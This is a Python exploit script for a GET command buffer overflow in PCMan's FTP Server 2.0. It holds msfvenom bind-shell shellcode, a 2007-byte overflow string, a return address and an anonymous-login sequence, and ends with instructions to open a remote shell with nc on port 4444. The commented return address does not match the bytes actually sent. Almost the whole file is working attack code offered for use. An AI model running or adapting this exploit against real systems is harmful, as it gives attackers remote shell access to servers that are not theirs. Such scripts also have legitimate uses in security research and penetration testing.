#!/usr/bin/python

# Exploit Title: PCMan's FTP Server v2.0 - GET command buffer overflow (remote shell)
# Date:  28 Aug 2015
# Exploit Author: Koby
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP SP3
# CVE : N/A

import socket
import sys

# msfvenom -p windows/shell_bind_tcp lhost=192.168.153.130 lport=4444 -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d' -f ruby
# Payload size: 352 bytes

buf = ("\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb5" 
"\x93\x9b\xfe\x83\xeb\xfc\xe2\xf4\x49\x7b\x19\xfe\xb5\x93" 
"\xfb\x77\x50\xa2\x5b\x9a\x3e\xc3\xab\x75\xe7\x9f\x10\xac" 
"\xa1\x18\xe9\xd6\xba\x24\xd1\xd8\x84\x6c\x37\xc2\xd4\xef" 
"\x99\xd2\x95\x52\x54\xf3\xb4\x54\x79\x0c\xe7\xc4\x10\xac" 
"\xa5\x18\xd1\xc2\x3e\xdf\x8a\x86\x56\xdb\x9a\x2f\xe4\x18" 
"\xc2\xde\xb4\x40\x10\xb7\xad\x70\xa1\xb7\x3e\xa7\x10\xff" 
"\x63\xa2\x64\x52\x74\x5c\x96\xff\x72\xab\x7b\x8b\x43\x90" 
"\xe6\x06\x8e\xee\xbf\x8b\x51\xcb\x10\xa6\x91\x92\x48\x98" 
"\x3e\x9f\xd0\x75\xed\x8f\x9a\x2d\x3e\x97\x10\xff\x65\x1a" 
"\xdf\xda\x91\xc8\xc0\x9f\xec\xc9\xca\x01\x55\xcc\xc4\xa4" 
"\x3e\x81\x70\x73\xe8\xf9\x9a\x73\x30\x21\x9b\xfe\xb5\xc3" 
"\xf3\xcf\x3e\xfc\x1c\x01\x60\x28\x6b\x4b\x17\xc5\xf3\x58" 
"\x20\x2e\x06\x01\x60\xaf\x9d\x82\xbf\x13\x60\x1e\xc0\x96" 
"\x20\xb9\xa6\xe1\xf4\x94\xb5\xc0\x64\x2b\xd6\xf2\xf7\x9d" 
"\x9b\xf6\xe3\x9b\xb5\x93\x9b\xfe"
)



# buffer overflow was found by fuzzing with ftp_pre_post (metasploit)
# bad data is a string of 2007 "A" characters to get to an EIP overwrite
# followed by the JMP ESP instruction 0x7c9d30eb in SHELL32.dll
baddata = '\x41'*2007+'\x4f\x31\x9d\x7c'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# change target IP/port as needed
# run this script then to connect use nc for your windows shell
# nc [target IP address] 4444
connect=s.connect(('192.168.153.130',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('GET ' + baddata +'\x90'*15+ buf+ '\r\n')
s.close()
